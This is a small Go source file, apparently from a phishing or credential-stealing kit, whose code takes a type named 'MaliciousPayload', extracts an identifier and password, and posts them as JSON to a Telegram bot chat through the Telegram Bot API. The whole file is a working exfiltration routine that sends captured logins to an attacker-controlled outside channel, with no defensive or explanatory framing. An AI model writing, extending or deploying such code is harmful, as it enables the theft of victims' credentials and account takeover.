package notify

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
)

func buildPayload(payload MaliciousPayload) *TelegramData {
	return &TelegramData{
		Identifier: payload.Identifier,
		Password:   payload.Password,
	}
}

// Main function for sending a payload to telegram.
func sendToTelegram(token string, chatId string, payload TelegramData) error {
	if token == "" || chatId == "" {
		return fmt.Errorf("missing token or chat id")
	}

	jsonBytes, err := json.MarshalIndent(payload, "", "  ")
	if err != nil {
		return err
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	data := map[string]string{
		"chat_id": chatId,
		"text":    string(jsonBytes),
	}

	body, err := json.Marshal(data)
	if err != nil {
		return err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {
		return err
	}

	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to send message, status: %s", resp.Status)
	}

	return nil
}
